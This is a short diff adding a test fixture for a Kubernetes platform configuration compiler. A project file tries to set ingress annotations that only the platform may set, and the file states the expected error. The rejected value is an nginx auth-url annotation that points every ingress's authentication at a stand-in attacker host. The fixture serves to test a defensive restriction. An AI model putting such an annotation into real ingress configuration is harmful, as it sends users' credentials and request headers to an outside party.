@@ -1,0 +1,9 @@
+# error: context layer 2 (level 1): global.okdp.ingress: a platform setting, level 0 only (Inputs.Context): a project sets global.okdp.provisioning, nothing else of global.okdp
+# A project's file (project.yaml) that sets annotations of every ingress, a
+# key the platform leaves unset (platform.yaml sets ingress.suffix and
+# ingress.className): the settings of global.okdp are the platform's,
+# whether it sets them or not, those the compiler reads and the others.
+global:
+  okdp:
+    ingress:
+      annotations: {nginx.ingress.kubernetes.io/auth-url: https://attacker.example/auth}
